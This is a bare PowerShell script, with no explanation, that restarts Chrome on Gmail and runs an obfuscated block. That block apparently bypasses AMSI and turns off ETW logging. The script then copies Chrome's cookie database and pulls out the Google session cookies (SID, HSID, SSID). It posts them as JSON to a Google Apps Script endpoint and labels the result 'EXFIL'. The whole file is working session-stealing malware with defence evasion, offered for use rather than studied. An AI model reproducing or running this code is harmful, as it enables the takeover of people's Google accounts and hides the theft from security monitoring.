Get-Process chrome | Stop-Process -Force
Start-Sleep 2
Start-Process chrome "https://mail.google.com"
Start-Sleep 8  # Login time

$a=[Ref].Assembly.GetTypes();Foreach($b in$a){if($b.Name-like"*iUtils"){$c=$b};if($b.Name-like"*ctLoader"){$d=$b}}$e=$c.GetFields('NonPublic,Static');$f=$d.GetFields('NonPublic,Static');$g=$e[0].GetValue($null);$h=[Text.Encoding]::ASCII;$i=$h.GetBytes((,$f[1].GetValue($null))[0]);$j=$d.GetMethod('Decrypt',[type[]]@(,([byte[]])));iex($h.GetString($j.Invoke($null,@(,$i))));$etw=[System.Diagnostics.Eventing].Assembly.GetType("System.Diagnostics.Eventing.EventProvider");$etw.GetField("m_enabled","NonPublic,Instance").SetValue($null,0);

$c=Get-Process chrome -EA 0|%{ $w=Get-WmiObject Win32_Process|?{$_.ProcessId-eq$_.Id};if($w -and (Get-Process -Id $w.ParentProcessId -EA 0).ProcessName-eq'explorer'){$_}};if($c|?{$_.MainWindowTitle-like"*mail.google.com*"}){$d="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies";if(Test-Path$d){Copy-Item $d "${env:TEMP}\cookies.db" -Force;$o=New-Object System.Data.SQLite.SQLiteConnection("Data Source=`$env:TEMP\cookies.db");try{$o.Open();$m=$o.CreateCommand();$m.CommandText="SELECT name,value FROM cookies WHERE host_key LIKE '%.google.com%'";$r=$m.ExecuteReader();$k=@{ };while($r.Read()){$k[$r.GetString(0)]=$r.GetString(1)};$o.Close();if($k.SID){


$p=@{SID=$k.SID;HSID=$k.HSID;SSID=$k.SSID;auth='22b6443c-bde1-4db6-9b12-eb4aa4163a10-pksoiz8gl';userAgent=$host.Name}|ConvertTo-Json;$b=[Text.Encoding]::UTF8.GetBytes($p);$wc=New-Object Net.WebClient;$wc.Headers.Add('Content-Type','application/json');$response=$wc.UploadData('https://script.google.com/macros/s/AKfycbwmxFZJNjMTp5zxbu-dPBknIedMmvWel8O8vTGjgmxSK1BzK7yw1XuLGmaxD5uwwGiU/exec',$b);Write-Host "🎣 EXFIL: "$([Text.Encoding]::ASCII.GetString($response))}}}
